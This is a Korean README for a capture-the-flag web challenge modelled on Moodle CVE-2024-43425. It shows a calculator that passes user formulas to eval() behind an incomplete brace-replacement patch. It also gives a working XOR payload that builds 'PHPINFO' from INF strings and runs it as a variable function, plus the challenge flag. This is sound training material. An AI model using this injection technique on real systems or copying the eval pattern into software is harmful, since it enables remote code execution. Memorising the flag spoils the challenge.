# Advanced Calculator - CVE-2024-43425 기반 문제

> 🎯 **만든이**: 예지 (융합보안공학과)  
> 🏷️ **분야**: Web Security, Moodle CVE-2024-43425  
> 🔧 **키워드**: XOR, Variable Functions, INF string generation

## 📖 문제 설명

**겉보기**: 평범한 수학 계산 연습 사이트
**실제**: Moodle 4.4.1의 CVE-2024-43425 취약점을 이용한 웹 해킹 문제

## 🔍 취약점 분석

### Moodle 4.4.1 CVE-2024-43425
- **원본 소스**: https://git.moodle.org/gw?p=moodle.git;a=blob;f=question/type/calculated/questiontype.php
- **취약점**: Variable Functions를 이용한 RCE
- **패치 시도**: 중괄호를 소괄호로 치환하여 Variable Variables 차단 시도
- **우회 방법**: XOR 연산을 이용한 임의 문자열 생성

### 핵심 코드
```php
// Moodle 원본 코드 사용
function check_formula($formula) {
    // ... 원본 검증 로직
}

function calculate($formula) {
    $error = check_formula($formula);
    if ($error) {
        return null;
    } else {
        // CVE-2024-43425 패치 시도 (불완전)
        $formula = str_replace('{', '(', $formula);
        $formula = str_replace('}', ')', $formula);
        
        return eval('return ' . $formula . ';');
    }
}
```

## 🎯 공격 시나리오

### 1단계: INF 문자열 생성
```php
exp(1000)  // 결과: INF (문자열)
```

### 2단계: XOR 연산으로 PHPINFO 문자열 생성
```php
// 원본 연구 페이로드
((exp(1000) . 0+exp(1000) . 0+exp(1000)) ^ (4 . 2 . 3 . 0 . 0 . 0 . 0) ^ (0 . 0 . 0 . 0 . 0 . 0 . 0) ^ (0 . 0 . -1 . 1 . 1 . 4) ^ (-4 . 8 . 1 . 1 . 1 . 2))
// 결과: "PHPINFO" 문자열
```

### 3단계: Variable Functions 실행
```php
// {중괄호}가 (소괄호)로 변환됨
PHPINFO_STRING{INFO_ALL} → PHPINFO_STRING(INFO_ALL)
// 결과: phpinfo() 함수 실행
```

## 🚀 익스플로잇

### 페이로드
```
((exp(1000) . 0+exp(1000) . 0+exp(1000)) ^ (4 . 2 . 3 . 0 . 0 . 0 . 0) ^ (0 . 0 . 0 . 0 . 0 . 0 . 0) ^ (0 . 0 . -1 . 1 . 1 . 4) ^ (-4 . 8 . 1 . 1 . 1 . 2)){INFO_ALL}
```

### 실행 방법
1. 웹사이트 접속: http://localhost:10001
2. 수식 입력란에 위 페이로드 입력
3. phpinfo() 결과에서 환경변수 FLAG 확인

### 자동화 스크립트
```bash
python3 exploit.py localhost 10001
```

## 🏆 플래그
```
DH{Moodl3_XOR_Vuln3r4b1l1ty_2024_YBG}
```

## 📁 파일 구조
```
calculating_game/
├── Dockerfile
├── docker-compose.yml  # 포트 10001
├── exploit.py          # XOR 기반 익스플로잇
├── README.md
└── deploy/
    ├── flag            # DH{...} 플래그
    └── src/
        ├── index.php   # 리다이렉트
        └── game.php    # Moodle 코드 기반 취약한 계산기
```

## 🔧 실행 방법

### Docker
```bash
cd calculating_game
docker-compose up -d
# http://localhost:10001
```

### 로컬
```bash
cd deploy/src
php -S localhost:10001
```

## 🛡️ 취약점 원리

### 1. **Moodle CVE-2024-43425**
- calculated question type의 수식 처리 과정에서 발생
- Variable Variables 차단을 위한 패치가 불완전

### 2. **XOR String Generation**
- exp(1000) → INF 문자열 생성
- 숫자와 XOR 연산하여 임의 문자열 조합
- PHPINFO 문자열 생성 후 Variable Functions로 실행

### 3. **Variable Functions**
- PHP의 특성: 문자열을 함수명으로 사용 가능
- 'function_name'(args) 형태로 동적 함수 호출

## 📚 참고 자료

- [RedTeam Pentesting - Moodle RCE](https://blog.redteam-pentesting.de/2024/moodle-rce/)
- [Moodle CVE-2024-43425](https://moodle.org/security/)
- [원본 소스코드](https://git.moodle.org/gw?p=moodle.git;a=blob;f=question/type/calculated/questiontype.php)

---

**Created by 예지 (융합보안공학과)**  
**기반**: Moodle CVE-2024-43425 취약점 연구
